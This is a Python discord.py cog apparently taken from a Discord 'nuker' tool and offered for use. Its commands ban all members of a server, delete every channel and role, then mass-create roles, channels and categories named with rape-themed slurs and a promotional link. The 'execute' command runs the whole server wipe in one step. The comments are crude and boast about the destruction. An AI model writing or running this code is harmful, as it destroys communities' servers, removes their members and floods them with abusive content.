import discord
from discord.ext import commands
from discord.ext import tasks
from colorama import Fore, init


#################################################################################
#                                                                               #
# This is a higly dangerous and volitile module please for the love of fuck     #
# Don't "accidentally" run shit in here then cry when you get raped by discord  #
# or the server gets nuked for example lol. It's just no it doesn't work well   #
#                                                                               #
# So please for the love of fucking god be CAREFUL                              #
#                                                                               #
#################################################################################


# NOTE: A lot of this code is based on the iFrost-Nuker which can be found here
# https://github.com/iFrost1337/iFrost-Nuker


class nukes(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def banAll(self, ctx):
        """Bans all members in the guild the command is used"""
        await ctx.message.delete()
        await ctx.send(
            "Well shit looks like this is getting nuked\n:wave:Bye Bye Members"
        )
        await ctx.send("Please stand by...")
        print(
            f"{Fore.RED}[-]DANGER > {Fore.RESET}Starting to ban all members of {ctx.guild} "
        )
        for member in ctx.guild.members:
            try:
                await member.ban()
            except:
                continue

    @commands.command()
    async def rolecreate(self, ctx):
        """Mass creates

        Usage
        • rolecreate
        """
        await ctx.message.delete()
        await ctx.send("Starting role creation..")
        await ctx.send("Please wait...")
        print("Spam role creating procession has begun!")
        for i in range(1, 25):
            await ctx.guild.create_role(
                name=f"RAPED BY DISCORAPE https://daddie.xyz{i}"
            )
            await ctx.send(f"Made channel > RAPED BY DISCORAPE {i}\nhttps://daddie.xyz")

    @commands.command()
    async def channelcreate(self, ctx):
        await ctx.message.delete()
        await ctx.send("Time to spam super fucking gay shit")
        await ctx.send("Standby for spam creation")
        print(f"{Fore.RED}[-]DANGER > Spam channel creation has begun!")
        for i in range(1, 25):
            await ctx.send(
                f"Creating > NUKED-BY-DISCORAPE-{i} | Voice, Text and Catagory\nhttps://daddie.xyz"
            )
            await ctx.guild.create_text_channel(
                name=f"NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
            )
            print(f"{Fore.RED}[-]DANGER > {Fore.RESET}Made text channel!")
            await ctx.guild.create_voice_channel(
                name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
            )
            print(f"{Fore.RED}[-]DANGER > {Fore.RESET}Made voice channel!")
            await ctx.guild.create_category(
                name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
            )
            print(f"{Fore.RED}[-]DANGER > {Fore.RESET}Made category!")

    @commands.command()
    async def channeldelete(self, ctx):
        await ctx.send("Deleting all channels...\nhttps://daddie.xyz")
        await ctx.send("Standby...")
        print(f"{Fore.RED}[-]DANGER > Channel nuking has begun!")
        for channel in ctx.guild.channels:
            print(f"{Fore.RED}[-]DANGER > {Fore.RESET}DELETED {channel}")
            await channel.delete()

    @commands.command()
    async def roledelete(self, ctx):
        await ctx.message.delete()
        await ctx.send("Spamming role deletion..")
        await ctx.send("Please wait...")
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.roles[-1] > role:
                await role.delete()
                print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Deleted {role}")

    @commands.command()
    async def execute(self, ctx):
        await ctx.message.delete()
        await ctx.send("Executing...\nhttps://i.imgur.com/vhzlkat.png")
        print(
            f"{Fore.RED}[-]DANGER > {Fore.RESET}Nuking has begun...\n{Fore.RED}[-]BANNING > {Fore.RESET}Banning process has begun\n"
        )
        for member in ctx.guild.members:
            try:
                print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Attempting to ban {member}")
                await member.ban()
                print(
                    f"{Fore.RED}[-]BANNING > {Fore.RESET}Successfully banned {member}"
                )
            except:
                continue

        print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Finished banning members")

        print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Started role DELETION")
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.roles[-1] > role:
                await role.delete()
                print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Deleted {role}")
            else:
                await ctx.send("There was an error while deleting the roles.")

        print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Starting to nuke roles")

        for i in range(1, 50):
            await ctx.guild.create_role(
                name=f"NUKED BY DISCORAPE https://daddie.xyz {i}"
            )
            print(
                f"{Fore.RED}[-]ROLE > {Fore.RESET}Made role NUKED BY DISCORAPE https://daddie.xyz {i}"
            )
        # SPAM ROLE SHIT CANT BE ASKED TO MAKE IT
        for channel in ctx.guild.channels:
            print(f"{Fore.RED}[-]CHANNEL > {Fore.RESET}DELETED {channel}")
            await channel.delete()
        # delete all channels so we can flood that shit lmfao

        for i in range(1, 25):
            await ctx.guild.create_text_channel(
                name=f"NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
            )
            print(
                f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made text channel! NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
            )
            await ctx.guild.create_voice_channel(
                name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
            )
            print(
                f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made voice channel! NUKED BY DISCORAPE {i} https://daddie.xyz"
            )
            await ctx.guild.create_category(
                name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
            )
            print(
                f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made category! NUKED BY DISCORAPE {i} https://daddie.xyz"
            )
        print(f"{Fore.RED}[-]NUKE > {Fore.RESET}Nuking finished!")


def setup(bot):
    bot.add_cog(nukes(bot))
